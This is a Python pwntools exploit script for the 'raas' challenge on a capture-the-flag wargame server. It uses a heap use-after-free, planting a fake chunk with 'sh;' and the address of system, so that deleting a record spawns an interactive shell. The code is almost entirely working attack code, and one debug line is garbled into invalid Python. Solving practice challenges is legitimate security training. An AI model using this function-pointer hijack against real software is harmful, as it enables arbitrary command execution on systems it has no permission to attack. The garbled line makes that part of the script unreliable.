#!/usr/bin/env python3
import re
from pwn import *
import pwnlib.shellcraft
import time

libc = ELF('./libc_32.so.6')
elf = ELF('./raas')
debug = False

c = 0
if debug:
    pwn_file="./ld-2.23.so --library-path ./ ./raas"
    c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_32.so.6'})
    print(c.libs())
else:
    c = remote('hackme.inndy.tw', 7719)

context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']
if debug:
    elf_path = c.cwd + c.argv[3].decode().strip('.') while not elf_path in c.libs(): time.sleep(0.5)
        print('wait loading')

    gdbcmd = '''
    file ./raas
    set $elf_base={}
    set $records={}
    b *0x8048942
    b *0x8048906

    c
    p *($records+0)
    p *($records+4)
    p *($records+8)
    vmmap
    bt
    '''.format(hex(c.libs()[elf_path]), elf.symbols['records'])

    gdb.attach(c, gdbcmd)

context.log_level ='debug'

def new_int(index, data):
    c.recvuntil('>')
    c.sendline('1')

    c.recvuntil('>')
    c.sendline(str(index))

    c.recvuntil('>')
    c.sendline('1')

    c.recvuntil('>')
    c.sendline(str(data))

def new_text(index, data):
    c.recvuntil('>')
    c.sendline('1')

    c.recvuntil('>')
    c.sendline(str(index))

    c.recvuntil('>')
    c.sendline('2')

    c.recvuntil('>')
    c.sendline(str(len(data) + 1))

    c.recvuntil('>')
    c.send(data)


def del_index(index):
    c.recvuntil('>')
    c.sendline('2')

    c.recvuntil('>')
    c.sendline(str(index))

fake_chunk = flat({0: b'sh;', 4: elf.plt['system']}, length= 4 * 3 - 1)

new_int(0, 0)
new_int(1, 0)
del_index(1)
del_index(0)
new_text(2, fake_chunk)

# get shell
c.recvuntil('>')
c.sendline('2')

c.recvuntil('>')
c.sendline(str(1))


c.interactive()
c.close()

